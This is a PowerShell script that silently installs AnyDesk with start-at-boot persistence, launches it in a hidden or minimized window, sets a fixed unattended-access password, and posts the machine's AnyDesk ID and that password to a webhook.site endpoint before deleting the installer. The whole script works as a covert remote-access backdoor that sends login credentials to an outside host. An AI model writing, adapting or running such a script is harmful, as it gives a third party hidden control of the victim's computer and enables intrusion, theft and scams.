$url = "https://download.anydesk.com/AnyDesk.exe"
$outputPath = "C:\AnyDesk.exe"

Invoke-WebRequest -Uri $url -OutFile $outputPath

C:\AnyDesk.exe --install "C:\Program Files (x86)\AnyDesk" --start-with-win --silent
Write-Host "Waiting for 10 seconds..."
Start-Sleep -Seconds 10
Write-Host "Done waiting!"

Start-Process -FilePath "powershell.exe" -ArgumentList '-NoProfile -Command Start-Process -FilePath "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" -WindowStyle Minimized' -WindowStyle Hidden


Write-Host "Waiting for 10 seconds..."
Start-Sleep -Seconds 10
Write-Host "Done waiting!"



Start-Sleep -Seconds 5

cmd /c 'echo SistAny | "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --set-password'

Start-Process -FilePath "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" -ArgumentList "--get-id" -RedirectStandardOutput "C:\Program Files (x86)\AnyDesk\AnyDesk_Output.txt" -NoNewWindow -Wait

$ID = Get-Content -Path "C:\Program Files (x86)\AnyDesk\AnyDesk_Output.txt" | ForEach-Object { $_.Trim() }

$webhookUrl = "https://webhook.site/2fe522fb-2bca-4689-aeeb-5169bf06f0e8"

# Send the request to the webhook
Invoke-WebRequest -Uri $webhookUrl -Method Post -Body "AnyDesk ID is: $ID AND Password is: SistAny"

Remove-Item "C:\AnyDesk.exe" -Force

exit



